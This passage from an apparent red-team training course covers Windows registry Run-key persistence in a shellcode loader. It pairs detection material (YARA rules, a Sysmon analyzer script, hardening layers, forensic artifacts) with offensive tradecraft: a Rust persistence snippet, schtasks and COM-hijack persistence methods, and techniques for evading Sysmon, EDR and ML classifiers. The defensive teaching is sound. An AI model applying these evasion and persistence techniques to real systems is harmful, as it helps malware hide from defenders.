### Exercise 8.1: Build Your Own

**Challenge**: Extend the persistence demo with a second persistence method (your choice: scheduled task, startup folder shortcut, or COM CLSID hijack). Requirements:

1. Add the persistence method after the existing Run key set
2. Add cleanup for the new method (remove before exit)
3. Add breadcrumbs for the new persistence set/clean operations
4. Ensure the new method also uses runtime path construction (no plaintext signatures)
5. Test that both methods are set and cleaned up correctly

### YARA Rule: Obfuscated Registry Path (u16 Hex Segments)

```yara
rule Obfuscated_Registry_Run_Path
{
    meta:
        description = "Detects u16 hex-encoded registry Run key path segments in .rdata"
        author = "Goodboy Course"
        stage = "11"

    strings:
        // "Software\" as u16 LE: 53 00 6F 00 66 00 74 00 77 00 61 00 72 00 65 00 5C 00
        $seg_soft = { 53 00 6F 00 66 00 74 00 77 00 61 00 72 00 65 00 5C 00 }
        // "Microsoft\" as u16 LE
        $seg_ms   = { 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 5C 00 }
        // "Run" as u16 LE (terminal segment)
        $seg_run  = { 52 00 75 00 6E 00 }
        // Registry APIs in IAT
        $reg_open = "RegOpenKeyExW" ascii
        $reg_set  = "RegSetValueExW" ascii

    condition:
        uint16(0) == 0x5A4D and
        all of ($seg_*) and
        $reg_open and $reg_set
}
```

> **Key insight**: Even though `build_run_path()` uses `black_box()` barriers to prevent the compiler from merging segments, the individual u16 arrays still appear in `.rdata` as separate byte sequences. YARA can match each segment independently. The obfuscation defeats *contiguous string* signatures but NOT *individual segment* signatures.

### Python Script: Sysmon Event 13 Persistence Analyzer

```python
#!/usr/bin/env python3
"""Parse Sysmon Event 13 logs to detect registry persistence set/delete pairs.
Calculates persistence window duration and correlates with process events.
Feed exported Sysmon XML or use with PowerShell pipeline."""

import xml.etree.ElementTree as ET
import sys, re, json
from datetime import datetime

def parse_sysmon_events(xml_path):
    """Parse exported Sysmon XML for Event ID 12/13 (registry events)."""
    events = []
    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()
    except ET.ParseError:
        # Try as raw event list
        with open(xml_path, "r", encoding="utf-8") as f:
            content = f.read()
        content = f"<Events>{content}</Events>"
        root = ET.fromstring(content)

    ns = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}

    for event in root.iter():
        if event.tag.endswith("Event") or event.tag == "Event":
            event_data = {}
            for data in event.iter():
                name = data.get("Name", data.tag.split("}")[-1] if "}" in data.tag else data.tag)
                if data.text:
                    event_data[name] = data.text

            event_id = event_data.get("EventID", "")
            if event_id in ("12", "13", "14"):
                events.append({
                    "event_id": int(event_id),
                    "timestamp": event_data.get("UtcTime", event_data.get("TimeCreated", "")),
                    "process": event_data.get("Image", ""),
                    "target": event_data.get("TargetObject", ""),
                    "details": event_data.get("Details", ""),
                    "event_type": event_data.get("EventType", ""),
                })
    return events

def analyze_persistence(events):
    """Find set/delete pairs targeting Run keys."""
    run_events = [e for e in events if "\\CurrentVersion\\Run\\" in e.get("target", "")]

    sets = [e for e in run_events if e["event_id"] == 13]
    deletes = [e for e in run_events if e["event_id"] == 12 and "DeleteValue" in e.get("event_type", "")]

    print(f"Registry Run Key Events: {len(run_events)}")
    print(f"  Value Sets (Event 13): {len(sets)}")
    print(f"  Value Deletes (Event 12): {len(deletes)}")
    print()

    # Match set/delete pairs by value name
    for s in sets:
        value_name = s["target"].split("\\")[-1]
        matching_delete = None
        for d in deletes:
            if d["target"].split("\\")[-1] == value_name:
                matching_delete = d
                break

        process = s["process"].split("\\")[-1] if s["process"] else "?"
        print(f"  \033[91m[SET]\033[0m {value_name}")
        print(f"    Process: {process}")
        print(f"    Target:  {s['target']}")
        print(f"    Data:    {s.get('details', 'N/A')}")
        print(f"    Time:    {s['timestamp']}")

        if matching_delete:
            print(f"  \033[92m[DEL]\033[0m {value_name}")
            print(f"    Time:    {matching_delete['timestamp']}")
            # Calculate window
            try:
                t_set = datetime.fromisoformat(s["timestamp"].replace(" ", "T"))
                t_del = datetime.fromisoformat(matching_delete["timestamp"].replace(" ", "T"))
                window = (t_del - t_set).total_seconds()
                print(f"    \033[93mPersistence window: {window:.1f} seconds\033[0m")
            except (ValueError, TypeError):
                print(f"    Persistence window: unable to parse timestamps")
        else:
            print(f"  \033[91m[NO DELETE]\033[0m Value still persists!")
        print()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <sysmon_export.xml>")
        print(f"  Export: wevtutil qe Microsoft-Windows-Sysmon/Operational /f:xml > sysmon.xml")
        sys.exit(1)

    events = parse_sysmon_events(sys.argv[1])
    if not events:
        print("No Sysmon events found. Check the XML format.")
        sys.exit(1)

    analyze_persistence(events)
```

### Exercise 9.1: Write a YARA Rule for u16 Path Detection

**Question**: The `Obfuscated_Registry_Run_Path` YARA rule above matches individual u16 segments. But what if the attacker uses a different registry path (e.g., `HKCU\Software\Classes\CLSID\...` for COM hijacking)? Write a more generic YARA rule that detects ANY u16-encoded registry path containing `Software\Microsoft\` regardless of the specific subkey.

<details>
<summary>Answer</summary>

```yara
rule Generic_U16_Registry_Path
{
    meta:
        description = "Detects u16 hex-encoded registry paths with Microsoft prefix"

    strings:
        // "Software\Microsoft\" is common to Run keys, COM hijack, service config
        $seg_soft_ms = { 53 00 6F 00 66 00 74 00 77 00 61 00 72 00 65 00 5C 00
                         4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 5C 00 }
        // Registry write API
        $reg_api = "RegSetValueExW" ascii

    condition:
        uint16(0) == 0x5A4D and $seg_soft_ms and $reg_api
}
```

**Key insight**: If the segments are contiguous (no `black_box()` barrier between "Software\" and "Microsoft\"), YARA can match the full 38-byte sequence in one pattern. If `black_box()` separates them, the compiler may place them non-contiguously and this rule would miss. The Stage 11 binary uses `black_box()` on each segment separately — whether the compiler keeps them adjacent depends on optimization level.

</details>

### Exercise 9.2: Forensic Timeline from Breadcrumbs

**Question**: You find these breadcrumb files in `%TEMP%` on a compromised system:

```
startmgr_1_start.txt          Created: 14:23:01.234
startmgr_2_checks_ok.txt      Created: 14:23:01.250
startmgr_3_window_done.txt    Created: 14:23:01.312
startmgr_4_debug_ok.txt       Created: 14:23:01.480
startmgr_5_sandbox_score_0.txt Created: 14:23:01.495
startmgr_5_sandbox_ok.txt     Created: 14:23:01.496
startmgr_6_persist_set.txt    Created: 14:23:01.510
```

Files `startmgr_7_pre_thread.txt` through `startmgr_9_done.txt` are MISSING. What happened?

<details>
<summary>Answer</summary>

The binary passed all 7 evasion gates (files 1-6 present) and successfully set the registry Run key (file 6 = `persist_set`). But the shellcode execution failed — file 7 (`pre_thread`) would have been written just before `CreateThread`, so the failure occurred between `VirtualProtect` changing permissions and the thread creation.

Possible causes:
1. **VirtualProtect failed** (returned 0): The `PAGE_EXECUTE_READ` protection change was denied, possibly by EDR hooking VirtualProtect
2. **CreateThread failed** (returned null): CFG blocked the thread start address, or DEP policy prevented execution from the allocated region
3. **Shellcode crashed**: The thread was created but the shellcode itself crashed before reaching the MessageBox call (corrupt decryption, wrong key, incompatible shellcode)

**How to investigate**: Check for a `startmgr_FAIL_alloc.txt` (allocation failed) or `startmgr_FAIL_thread.txt` (thread creation failed). If neither exists, the failure is between the last dbg() call and the next checkpoint — specifically in the VirtualProtect→CreateThread sequence.

**The persistence key was set but never cleaned up** (file 8 = `persist_clean` is missing). This means `HKCU\...\Run\StartupOptSvc` still exists on the system and will attempt to re-execute the binary on next logon. An IR responder should immediately check `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v StartupOptSvc`.

</details>

### Section 7B: Hardening Registry Persistence Monitoring

**Layered defense for detecting and preventing registry persistence:**

```
Layer 1: Sysmon (real-time)
  ☐ Deploy Sysmon v15+ with RegistryEvent rules for \CurrentVersion\Run\
  ☐ Include Event ID 12 (Create/Delete) + 13 (ValueSet) + 14 (Rename)
  ☐ Forward events to SIEM with <30s latency
  ☐ Alert on unsigned binaries writing to Run keys

Layer 2: Autoruns Baseline (periodic)
  ☐ Run Autoruns /a /accepteula /m -s weekly via scheduled task
  ☐ Diff against known-good baseline (autorunsc -a * -c > baseline.csv)
  ☐ Alert on any NEW entry not in baseline
  ☐ Special attention to non-standard paths (outside Program Files)

Layer 3: AppLocker / WDAC (preventive)
  ☐ Restrict Run key executables to signed binaries only
  ☐ Use path rules: allow only C:\Program Files\*, C:\Windows\*
  ☐ Audit mode first → 30 days → enforce mode
  ☐ Exception process for legitimate unsigned software

Layer 4: EDR Behavioral Rules (detection)
  ☐ Alert on: RegSetValueExW → VirtualAlloc → VirtualProtect → CreateThread
    within same process within 5 seconds (persistence + injection combo)
  ☐ Alert on: Run key set then deleted within 60 seconds (demo/testing pattern)
  ☐ Alert on: Process from non-standard path writing to Run keys
```

**Key insight**: No single layer catches everything. Sysmon catches the write but not the execution. AppLocker prevents execution but not the write. EDR correlates both but may miss obfuscated paths. Autoruns catches persistent changes but not transient set-then-delete patterns. Use all four layers.

---

## Adversarial Thinking — Evolving Past Registry Persistence

### Challenge 1: Evading Sysmon Event 13

**Scenario**: The IR team has Sysmon configured to alert on all `\CurrentVersion\Run\` registry modifications (Event ID 13). Your Run key write triggers an alert within seconds. How do you persist without touching Run keys?

**Approach A — Scheduled Tasks**:
`schtasks /create /tn "OptimizeSvc" /tr <exe_path> /sc onlogon /rl limited`. Scheduled tasks persist in `C:\Windows\System32\Tasks\` as XML files and in the `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache` registry tree. Sysmon Event 13 filters for `\CurrentVersion\Run\` would miss this entirely. Detection requires Sysmon Event 1 (process creation from `schtasks.exe`) or Task Scheduler event logs (Event ID 106/140).

**Approach B — COM Object Hijacking**:
Write a registry value under `HKCU\Software\Classes\CLSID\{<target-CLSID>}\InprocServer32` pointing to a malicious DLL. When any application loads that COM object, your DLL executes. This uses a different registry path than Run keys — Sysmon must be configured with CLSID-specific rules to catch it. Common hijack targets: `{BCDE0395-E52F-467C-8E3D-C4579291692E}` (MMDeviceEnumerator, loaded by many apps).

**Approach C — WMI Event Subscriptions**:
Create a permanent WMI event subscription that triggers on user logon. The persistence data lives in the WMI repository (`C:\Windows\System32\wbem\Repository\`), not in standard registry locations. Sysmon added WMI event logging (Event ID 19/20/21) in later versions, but many deployments don't enable it.

**Approach D — AppInit DLLs**:
Set `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs` to load a DLL into every GUI process. This IS a registry write, but it's a different path than `\CurrentVersion\Run\` — the Sysmon rule must explicitly cover it.

**Defensive takeaway**: No single Sysmon rule catches all persistence. Layered monitoring across Run keys, scheduled tasks, COM objects, WMI subscriptions, services, and startup folders is required.

### Challenge 2: Forensic Artifact Analysis

**Scenario**: An IR team finds your `StartupOptSvc` Run key entry. What forensic artifacts can they use to determine WHEN it was created, even after the binary cleaned it up?

**Registry Last-Write Timestamp**:
Every registry key has a `LastWriteTime` (analogous to file modification time). When `RegSetValueExW` writes `StartupOptSvc`, the parent `Run` key's `LastWriteTime` updates. Even after `RegDeleteValueW` removes the value, the key's timestamp reflects the last modification. The IR team can compare this timestamp against the binary's execution timeline.

**Sysmon Event Logs**:
If Sysmon was running, Event 13 (RegistryValueSet) logged the exact timestamp, process, value name, and data BEFORE cleanup. Event 12 (RegistryKeyDelete or RegistryValueDelete) logged the removal. These logs survive in the Windows Event Log even after the registry value is gone.

**USN Journal**:
The NTFS USN (Update Sequence Number) journal records filesystem operations. If the binary wrote itself to a new location before setting the Run key, the USN journal captures the file creation timestamp and parent directory.

**Prefetch Files**:
`C:\Windows\Prefetch\PERSISTENCE-DEMO.EXE-<hash>.pf` records the first and last execution times, run count, and files/directories accessed. This survives regardless of registry cleanup.

**MFT Timestamps**:
The NTFS Master File Table records `$STANDARD_INFORMATION` and `$FILE_NAME` timestamps for the executable. `$SI` can be timestomped, but `$FN` timestamps (maintained by the kernel) are harder to forge.

**Defensive takeaway**: Registry cleanup removes the PERSISTENCE, not the EVIDENCE. A thorough IR investigation recovers the timeline from at least 3-4 independent artifact sources.

### Challenge 3: Minimal Code Mass Persistence

**Scenario**: The 124KB persistence code mass from `full_install()` pushed ML classifiers over detection thresholds. Design a MINIMAL persistence method that adds less than 5KB of code to the binary.

**Solution — Single RegSetValueExW Call**:
```rust
// Entire persistence in ~20 lines, <2KB compiled
let path = build_run_path();  // u16 hex array construction (~500 bytes)
let mut key: HKEY = std::ptr::null_mut();
RegOpenKeyExW(HKEY_CURRENT_USER, path.as_ptr(), 0, KEY_WRITE, &mut key);
RegSetValueExW(key, value_name.as_ptr(), 0, REG_SZ, data.as_ptr(), data_len);
RegCloseKey(key);
```

This uses 3 API calls (Open, Set, Close) via direct IAT imports. No scheduled task XML parsing, no COM CLSID resolution, no WMI MOF compilation, no startup folder shortcut creation. The registry APIs are already imported by the `windows-sys` crate for the demo flow — zero additional DLL dependencies.

**Code mass breakdown**:
- `build_run_path()`: ~500 bytes (u16 arrays + Vec assembly)
- `RegOpenKeyExW` + `RegSetValueExW` + `RegCloseKey`: ~200 bytes (3 calls with arguments)
- Value name construction: ~100 bytes
- Error handling: ~200 bytes
- Total: ~1KB compiled — 124x smaller than `full_install()`

**Trade-off**: Single-method persistence is less resilient (one registry deletion removes it) but invisible to ML classifiers. In practice, a Run key that survives one investigation is more valuable than 5 persistence methods that get the binary flagged at 2/76 on VT.

---

## Dynamic Analysis — Observing Persistence in Action

### Exercise: Process Monitor Registry Tracing (10 min)

1. Launch Process Monitor (Procmon) with these filters:
   - `Process Name` is `persistence-demo.exe`
   - `Operation` begins with `Reg`
2. Run `persistence-demo.exe` from a command prompt
3. Observe the Procmon output:

```
Expected Procmon entries (in order):
  RegOpenKey   HKCU\Software\Microsoft\Windows\CurrentVersion\Run  SUCCESS
  RegSetValue  HKCU\...\Run\StartupOptSvc                         SUCCESS
  RegCloseKey  HKCU\...\Run                                        SUCCESS
  [... shellcode execution ...]
  RegOpenKey   HKCU\Software\Microsoft\Windows\CurrentVersion\Run  SUCCESS
  RegDeleteValue HKCU\...\Run\StartupOptSvc                       SUCCESS
  RegCloseKey  HKCU\...\Run                                        SUCCESS
```

Key observations:
- The full registry path appears in Procmon regardless of how the binary constructed it internally (u16 hex arrays are invisible to Procmon — it sees the kernel-level operation)
- The `RegSetValue` entry shows the full data (exe path) in the Detail column
- The `RegDeleteValue` confirms cleanup — but Procmon already recorded the SET operation

### Exercise: Sysmon Event 13 Capture (10 min)

1. Install Sysmon with a configuration that includes registry monitoring:
   ```xml
   <RegistryEvent onmatch="include">
       <TargetObject condition="contains">\CurrentVersion\Run\</TargetObject>
   </RegistryEvent>
   ```
2. Run `persistence-demo.exe`
3. Check Windows Event Viewer: `Applications and Services Logs > Microsoft > Windows > Sysmon > Operational`
4. Filter for Event ID 13 (RegistryValueSet):

```
Expected Sysmon events:
  Event 13: Registry value set
    RuleName: -
    EventType: SetValue
    ProcessId: <PID>
    Image: C:\...\persistence-demo.exe
    TargetObject: HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run\StartupOptSvc
    Details: C:\...\persistence-demo.exe

  Event 13: Registry value deleted (Event 12 in some Sysmon versions)
    EventType: DeleteValue
    Image: C:\...\persistence-demo.exe
    TargetObject: HKU\<SID>\...\Run\StartupOptSvc
```

The Sysmon log persists even after the binary deletes the Run key value. This is the forensic evidence that survives cleanup — the binary removed the persistence, but Sysmon recorded it.

### Exercise: Breadcrumb Trail Inspection (5 min)

After running the binary, check `%TEMP%` for the full breadcrumb sequence:

```
startmgr_1_start.txt          → Gate 1 entry
startmgr_2_checks_ok.txt      → Gates 1-2 passed
startmgr_3_window_done.txt    → Gate 4 completed
startmgr_4_debug_ok.txt       → Gate 5 passed (no debugger)
startmgr_5_sandbox_score_0.txt → Gate 7 score = 0
startmgr_5_sandbox_ok.txt     → Gate 7 passed
startmgr_6_persist_set.txt    → Run key WRITTEN
startmgr_7_pre_thread.txt     → About to execute shellcode
startmgr_8_persist_clean.txt  → Run key REMOVED
startmgr_9_done.txt           → Full chain completed
```

Each breadcrumb file's creation timestamp in Explorer or `dir /tc` shows the exact time each gate was reached. The gap between `_6_persist_set` and `_8_persist_clean` is the window during which the Run key existed — typically under 1 second for the test stub shellcode.

If any breadcrumb is missing, the binary stopped at that gate. Common failure points:
- Missing `_4_debug_ok`: debugger attached (Gate 5 killed the process)
- Missing `_5_sandbox_ok`: running in a default VM (Gate 7 score >= 3)
- Missing `_6_persist_set`: all gates passed but persistence write failed (permissions?)

---

## Summary Table

| Component | Implementation | Evasion Technique |
|-----------|---------------|-------------------|
| Registry path | `HKCU\...\Run` | u16 hex arrays + `black_box()` barriers |
| Value name | `StartupOptSvc` | Mimics legitimate service name |
| Injection APIs | VirtualAlloc/VirtualProtect/CreateThread | Direct IAT imports (not apihash) |
| Shellcode crypto | XOR with 16-byte key | Simple loop, no crypto library |
| Memory permissions | RW → RX (never RWX) | Matches JIT compiler pattern |
| Anti-debug | PEB + NtQIP + RDTSC + HW BP | ExitProcess via apihash |
| Anti-sandbox | CPU/RAM/Disk/Uptime/Screen | Inline checks, no suspicious strings |
| GUI lifecycle | RegisterClassW + message loop | Legitimate Win32 API pattern |
| Cleanup | RegDeleteValueW after execution | No artifacts remain |
| Proof text | Generic descriptions only | No offensive API names in .rdata |

### MITRE ATT&CK Mapping

| Technique | ID | Implementation |
|-----------|----|----------------|
| Registry Run Keys | T1547.001 | `HKCU\...\Run\StartupOptSvc` |
| Obfuscated Files or Information | T1027 | XOR-encrypted shellcode |
| Virtualization/Sandbox Evasion | T1497.001 | Hardware sandbox checks |
| Debugger Evasion | T1622 | PEB, NtQIP, RDTSC, HW BP |
| Process Injection | T1055 | VirtualAlloc + CreateThread |
| Indicator Removal | T1070.009 | Registry cleanup after demo |
| Masquerading | T1036 | Window class "StartMgrW", trace prefix "startmgr_", value name "StartupOptSvc" |
| Dynamic API Resolution | T1027.007 | ExitProcess via apihash (2 calls only) |

### Common Misconceptions

| What People Believe | What's Actually True |
|--------------------|-----------------------|
| "Run key persistence is too basic for modern red teams" | HKCU Run keys remain one of the most reliable persistence mechanisms precisely because they blend with thousands of legitimate entries from software installers, updaters, and system utilities. Exotic persistence (COM hijack, WMI) draws more EDR scrutiny than a well-named Run value |
| "You need HKLM for reliable persistence" | HKCU requires no admin rights, triggers no UAC, and is LESS monitored by EDR than HKLM. On single-user workstations (the vast majority), HKCU is strictly superior. HKLM is only needed for multi-user persistence |
| "obf!() macro is the best way to hide registry paths" | The obf!() macro generates XOR decryption loops that CrowdStrike ML flags at 60% confidence. Raw u16 hex arrays with black_box() barriers are INVISIBLE to ML — they look like generic Vec operations, not crypto |
| "More persistence methods = better survival" | The full_install() function with 5 methods added 124KB of offensive code and triggered 2 detections (Google + Varist). REMOVING them killed both detections. Aggregate offensive code mass is itself a signature |
| "API hashing is always better than direct imports" | For common APIs like VirtualAlloc/VirtualProtect/CreateThread, direct IAT imports are LESS suspicious than apihash. Every Win32 GUI app imports these. Apihash PEB walks are cumulative ML signals — 5+ calls push CrowdStrike to 60% confidence |
| "Registry cleanup eliminates all forensic evidence" | RegDeleteValueW removes the value, but Windows generates Sysmon Event 13 (RegistryValueSet) and Event 12 (RegistryValueDelete) logs. USN journal, prefetch, and MFT timestamps also survive. The registry operation itself is the detection surface, not the binary's string construction |

### What Breaks at Stage 12 — The Bridge

Stage 11 executes shellcode via `VirtualAlloc → memcpy → VirtualProtect → CreateThread` — the memory region has **no backing module**. EDR memory scanners trivially detect executable regions that aren't backed by a loaded DLL (VAD scan). Stage 12 solves this by **overwriting a legitimate DLL's .text section** (module stomping), making the shellcode appear as if it belongs to a Microsoft-signed module.

Additionally, Stage 11 uses direct IAT imports for injection APIs (VirtualAlloc visible in the import table). Stage 12 moves to full apihash resolution — zero injection APIs in the IAT — because the module stomping technique specifically targets EDRs that inspect IAT entries.

### Further Reading (2025-2026)

**Persistence techniques:**
- [cocomelonc: Persistence Series (29 parts)](https://cocomelonc.github.io/persistence/) — Comprehensive Windows persistence from Run keys to bootkit-level techniques in C (2022-2025)
- [Altered Security CETP](https://www.alteredsecurity.com/evasionlab) — Certified Evasion Techniques Professional covers persistence as a core competency (March 2026)

**BYOVD and advanced persistence:**
- [Huntress: BYOVD for Persistence (Feb 2026)](https://www.huntress.com/blog) — Bring Your Own Vulnerable Driver as a persistence mechanism
- [Elastic: Persistence via WMI Event Subscriptions](https://www.elastic.co/security-labs) — Detection engineering for WMI persistence

**Detection engineering:**
- [Microsoft: Sysmon v15 Registry Monitoring](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) — Event ID 12/13/14 for registry persistence detection
- [Sigma HQ: Registry Run Keys Rules](https://github.com/SigmaHQ/sigma) — Community Sigma rules for T1547.001 detection
